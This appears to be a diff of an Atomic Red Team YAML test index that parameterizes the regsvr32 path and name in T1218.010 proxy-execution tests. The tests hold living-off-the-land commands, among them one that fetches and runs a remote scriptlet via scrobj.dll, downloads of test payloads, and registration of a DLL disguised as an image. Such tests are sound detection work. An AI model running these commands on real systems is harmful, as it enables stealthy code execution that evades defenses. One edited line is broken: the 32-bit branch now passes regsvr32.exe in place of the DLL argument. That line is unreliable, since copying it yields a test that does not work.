@@ -37564,6 +37564,14 @@ defense-evasion:
           description: Name of the local file, include path.
           type: Path
           default: PathToAtomicsFolder\T1218.010\src\RegSvr32.sct
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: Path
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
       dependency_executor_name: powershell
       dependencies:
       - description: 'Regsvr32.sct must exist on disk at specified location (#{filename})
@@ -37576,9 +37584,7 @@ defense-evasion:
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
       executor:
-        command: 'regsvr32.exe /s /u /i:#{filename} scrobj.dll
-
-'
+        command: "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{filename} scrobj.dll\n"
         name: command_prompt
     - name: Regsvr32 remote COM scriptlet execution
       auto_generated_guid: c9d0c4ef-8a96-4794-a75b-3d3a5e6f2a36
@@ -37592,10 +37598,16 @@ defense-evasion:
           description: URL to hosted sct file
           type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: Path
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
       executor:
-        command: 'regsvr32.exe /s /u /i:#{url} scrobj.dll
-
-'
+        command: "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n"
         name: command_prompt
     - name: Regsvr32 local DLL execution
       auto_generated_guid: '08ffca73-9a3d-471a-aeb0-68b4aa3ab37b'
@@ -37610,6 +37622,14 @@ defense-evasion:
           description: Name of DLL to Execute, DLL Should export DllRegisterServer
           type: Path
           default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx86.dll
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: Path
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
       dependency_executor_name: powershell
       dependencies:
       - description: 'AllTheThingsx86.dll must exist on disk at specified location
@@ -37624,7 +37644,7 @@ defense-evasion:
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
       executor:
         command: 'IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe
-          /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
+          /s #{dll_name}) ELSE ( regsvr32.exe /s #{regsvr32path}\#{regsvr32name} )
 
 '
         name: command_prompt
@@ -37641,6 +37661,14 @@ defense-evasion:
           description: Path to renamed dll file to be registered
           type: Path
           default: "%temp%\\shell32.jpg"
+        regsvr32path:
+          description: Default location of Regsvr32.exe
+          type: Path
+          default: C:\Windows\system32
+        regsvr32name:
+          description: Default name of Regsvr32.exe
+          type: String
+          default: regsvr32.exe
       dependency_executor_name: command_prompt
       dependencies:
       - description: 'Test requires a renamed dll file
@@ -37655,12 +37683,8 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'regsvr32 /s #{dll_file}
-
-'
-        cleanup_command: 'regsvr32 /U /s #{dll_file}
-
-'
+        command: "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n"
+        cleanup_command: "#{regsvr32path}\\#{regsvr32name} /U /s #{dll_file}\n"
   T1036.003:
     technique:
       external_references:
